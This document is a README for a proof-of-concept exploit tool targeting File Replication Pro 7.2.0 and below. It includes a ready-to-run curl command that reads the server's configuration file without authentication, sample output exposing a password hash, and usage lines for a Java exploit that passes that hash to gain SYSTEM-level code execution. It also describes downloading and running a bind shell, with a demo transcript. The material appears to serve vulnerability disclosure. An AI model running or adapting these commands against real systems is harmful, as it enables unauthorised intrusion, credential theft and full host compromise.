# file-replication-pro-exploit
PoC RCE exploit client for File Replication Pro 7.2.0 and below.
## Demo Video
```
Demo: https://www.youtube.com/watch?v=FCIjDwSiVDU
```
The following command can be used to test whether a FRP server is vulnerable to unauthenticated remote file disclosure vulnerability on Windows: (The log_path parameter can be tweaked to accomodate other OSes.)
```
curl "http://<victim>:9100/DetailedLogReader.jsp?log_path=C:\Program+Files\FileReplicationPro\\etc\\configuration.xml"
```
If the remote FRP host is vulnerable, the output should be something as follows:
```
<?xml version="1.0" encoding="UTF-8"?><Model><Version>4.2</Version><Sequence>23</Sequence><LanMaster><LanID>V00D00-WIN7SP1</LanID><LanName>10.0.2.15</LanName><ConsoleHostName>v00d00-win7sp1</ConsoleHostName><ComputerMaster><LanID>V00D00-WIN7SP1</LanID><HostName>V00D00-WIN7SP1</HostName><ComputerID>c8156cf:15547b3c17e:-8000</ComputerID><License>:Unlicensed</License><PasswordProtected>true</PasswordProtected><Password>KJG6zu7xZS7mmClNoOcbp4oqQGQ=</Password><Version>7.2</Version><CompAdapterDtl><LanID>V00D00-WIN7SP1</LanID><ComputerID>c8156cf:15547b3c17e:-8000</ComputerID><AdapterNum>0</AdapterNum><IPAddress>169.254.172.118</IPAddress><Port>9200</Port></CompAdapterDtl><CompAdapterDtl><LanID>V00D00-WIN7SP1</LanID><ComputerID>c8156cf:15547b3c17e:-8000</ComputerID><AdapterNum>1</AdapterNum><IPAddress>192.168.56.101</IPAddress><Port>9200</Port></CompAdapterDtl><CompAdapterDtl><LanID>V00D00-WIN7SP1</LanID><ComputerID>c8156cf:15547b3c17e:-8000</ComputerID><AdapterNum>2</AdapterNum><IPAddress>v00d00-win7sp1</IPAddress><Port>9200</Port></CompAdapterDtl><Roving>false</Roving></ComputerMaster><Settings/></LanMaster></Model>
```
There is no password in a default installation of FRP. However, if there is a password set, you should be able to obtain the password hash between the <Password> tags, such as:
```
<Password>KJG6zu7xZS7mmClNoOcbp4oqQGQ=</Password>
```
## Exploit Usage
The exploit client can be executed with the following command shown below. If there is no password set, replace the password argument with "". If there is a password set, replace the password argument with the password hash obtained using the unauthenticated remote file disclosure vulnerability shown above.
```
java -cp FRP_Sploit.jar Main
usage: java -cp FRP_Sploit.jar Main <IP> <Port> <Password>
e.g. : java -cp FRP_Sploit.jar Main 127.0.0.1 9200 <PwdHashFromConfig.xml>
       java -cp FRP_Sploit.jar Main 127.0.0.1 9200 ""
```
Command used in the demo video:
```
java -cp FRP_Sploit.jar Main 192.168.56.101 9200 KJG6zu7xZS7mmClNoOcbp4oqQGQ=
```
Sample Output:
```
[ * ] Connected to 192.168.56.101 as NT AUTHORITY\SYSTEM

[ * ] Downloaded remote bind shell and executing it on: 192.168.56.101:9200

[ * ] Please be patient ...

[ ! ] Please wait a few moments before attempting to connect to 192.168.56.101 on port 99.


---- SHELL SPAWNED ----
```
## Tweaks
This exploit client exploits the weak authentication mechanism which ultimately results in RCE as the SYSTEM or root user on the remote host. You can tweak the commands in the source and recompile it to your liking. For my demo, I used PowerShell to download a bind shell binary which is then executed and binds to port 99.
